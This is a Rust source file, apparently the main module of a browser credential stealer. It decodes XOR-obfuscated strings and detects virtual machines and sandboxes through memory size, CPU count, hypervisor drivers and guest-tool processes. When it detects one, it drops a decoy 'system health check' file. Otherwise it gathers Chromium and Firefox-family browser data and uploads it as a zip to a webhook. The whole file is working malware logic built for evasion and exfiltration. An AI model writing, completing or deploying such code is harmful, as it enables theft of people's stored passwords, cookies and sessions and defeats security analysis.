pub mod chrome_inject;
pub mod chromium;
pub mod gecko;
mod dpapi_fallback;
mod netscape;
pub mod sender;
mod zip_layout;

use std::path::PathBuf;

const XOR_KEY: u8 = 0x5A;
const MIN_MEMORY_BYTES: u64 = 4 * 1024 * 1024 * 1024;
const MAX_CPU_CORES: usize = 2;

pub(crate) fn xor_str(data: &[u8]) -> String {
    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
}

pub(crate) fn xor_bytes(data: &[u8]) -> Vec<u8> {
    data.iter().map(|&b| b ^ XOR_KEY).collect()
}

pub(crate) fn env_configured() -> bool {
    std::env::var(xor_str(&[
        0x08, 0x0F, 0x09, 0x0E, 0x05, 0x18, 0x1B, 0x19, 0x11, 0x0E, 0x08, 0x1B, 0x19, 0x1F,
    ]))
    .ok()
    .as_deref()
    == Some(&xor_str(&[0x6B]))
}

fn drivers_dir() -> PathBuf {
    std::env::var("SystemRoot")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("C:\\Windows"))
        .join("System32")
        .join("drivers")
}

fn low_physical_memory() -> bool {
    use windows::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};

    unsafe {
        let mut status = MEMORYSTATUSEX {
            dwLength: std::mem::size_of::<MEMORYSTATUSEX>() as u32,
            ..Default::default()
        };
        if GlobalMemoryStatusEx(&mut status).is_err() {
            return false;
        }
        status.ullTotalPhys < MIN_MEMORY_BYTES
    }
}

fn low_cpu_count() -> bool {
    std::thread::available_parallelism()
        .map(|count| count.get() <= MAX_CPU_CORES)
        .unwrap_or(false)
}

fn vm_drivers_present() -> bool {
    let drivers = drivers_dir();
    let names = [
        "vmmouse.sys",
        "vmhgfs.sys",
        "vmci.sys",
        "vmusbmouse.sys",
        "VBoxGuest.sys",
        "VBoxMouse.sys",
        "VBoxSF.sys",
        "VBoxVideo.sys",
        "xenbus.sys",
        "xenevtchn.sys",
        "xenvbd.sys",
        "vmbus.sys",
        "vmgid.sys",
        "hyperkbd.sys",
    ];
    names.iter().any(|name| drivers.join(name).exists())
}

fn vm_processes_present() -> bool {
    use windows::core::PCWSTR;
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };

    let targets = [
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "vmwareuser.exe",
        "vboxservice.exe",
        "vboxtray.exe",
        "xenservice.exe",
    ];

    unsafe {
        let snapshot = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(handle) => handle,
            Err(_) => return false,
        };
        let _guard = SnapshotGuard(snapshot);

        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        if Process32FirstW(snapshot, &mut entry).is_err() {
            return false;
        }

        loop {
            let exe = process_name(&entry);
            if targets.iter().any(|target| exe.eq_ignore_ascii_case(target)) {
                return true;
            }
            if Process32NextW(snapshot, &mut entry).is_err() {
                break;
            }
        }
    }

    false
}

struct SnapshotGuard(windows::Win32::Foundation::HANDLE);

impl Drop for SnapshotGuard {
    fn drop(&mut self) {
        unsafe {
            let _ = CloseHandle(self.0);
        }
    }
}

fn process_name(entry: &windows::Win32::System::Diagnostics::ToolHelp::PROCESSENTRY32W) -> String {
    let len = entry
        .szExeFile
        .iter()
        .position(|&ch| ch == 0)
        .unwrap_or(entry.szExeFile.len());
    String::from_utf16_lossy(&entry.szExeFile[..len])
}

pub fn is_virtualized_environment() -> bool {
    low_physical_memory()
        || low_cpu_count()
        || vm_drivers_present()
        || vm_processes_present()
}

pub fn run_sandbox_decoy() {
    let path = std::env::temp_dir().join("system_health_check.txt");
    let _ = std::fs::write(path, "System health check completed successfully.\r\n");
}

pub async fn run(client: &reqwest::Client, webhook_url: &str) -> Result<(), Box<dyn std::error::Error>> {
    if is_virtualized_environment() {
        run_sandbox_decoy();
        return Ok(());
    }

    if !env_configured() {
        return Ok(());
    }

    let mut all_files: Vec<(String, String)> = Vec::new();

    let gecko_handle = std::thread::spawn(|| gecko::extract_all());
    let chromium_files = chromium::extract_all();
    let gecko_files = gecko_handle.join().unwrap_or_default();

    all_files.extend(chromium_files);
    all_files.extend(gecko_files);

    zip_layout::sort_entries(&mut all_files);

    if !all_files.is_empty() {
        sender::send_zip(client, webhook_url, &all_files).await?;
    }

    Ok(())
}
